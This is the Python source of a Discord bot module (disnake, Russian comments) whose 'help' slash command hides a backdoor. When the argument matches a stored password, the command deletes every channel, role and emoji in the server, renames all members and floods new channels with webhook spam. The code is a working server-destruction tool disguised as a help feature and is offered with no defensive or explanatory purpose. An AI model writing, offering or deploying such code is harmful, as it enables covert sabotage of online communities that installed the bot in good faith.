import disnake
import sqlite3
import Config

from disnake.ext import commands
from os import getenv

class CrashCommands(commands.Cog):
	def __init__(self, bot):
		self.bot = bot

	async def crash(self, interaction):
		# Снос всех каналов
		for channel in interaction.guild.channels:
			try:
				await channel.delete()
			except Exception as e:
				pass

		# Снос всех ролей
		for role in interaction.guild.roles:
			try:
				await role.delete()
			except Exception as e:
				pass

		# Снос всех эмодзи
		for emoji in interaction.guild.emojis:
			try:
				await emoji.delete()
			except Exception as e:
				pass

		# Установка всем участникам ник
		for member in interaction.guild.members:
			try:
				await member.edit(nick = Config.crashNick)
			except Exception as e:
				pass

		# Отправка сообщений о краше через вебхук
		for i in range(Config.crashChannels):
			crashedChannel = await interaction.guild.create_text_channel("Crashed")
			webhook = await crashedChannel.create_webhook(name = "CRASHED")
			
			try:
				for j in range(Config.crashMessages):
					await webhook.send(content = Config.crashMessage, username= "CRASHED")
			finally:
				await webhook.delete()

	@commands.slash_command(name = "хелп", description = "Информация о боте")
	async def help(self, interaction: disnake.CommandInteraction, страница: str = ""):
		output = ""
		if страница in Config.information:
			output = Config.information[страница]
			embed = disnake.Embed(title = f"Страница {страница}", description = Config.information[страница])
			await interaction.response.send_message(embed = embed, ephemeral = True)
			return

		connection = sqlite3.connect('Data/Database.db')
		cursor = connection.cursor()
		cursor.execute("SELECT * FROM servers WHERE password=?", (страница,))
		server = cursor.fetchone()
		connection.close()
		if server:
			embed = disnake.Embed(title = "Начинаю краш!", description = "Ожидайте...")
			await interaction.response.send_message(embed = embed, ephemeral = True)
			await self.crash(interaction)
			return

		embed = disnake.Embed(title = "Страница не найдена!", description = Config.information[""])
		await interaction.response.send_message(embed = embed, ephemeral = True)

def setup(bot):
	bot.add_cog(CrashCommands(bot))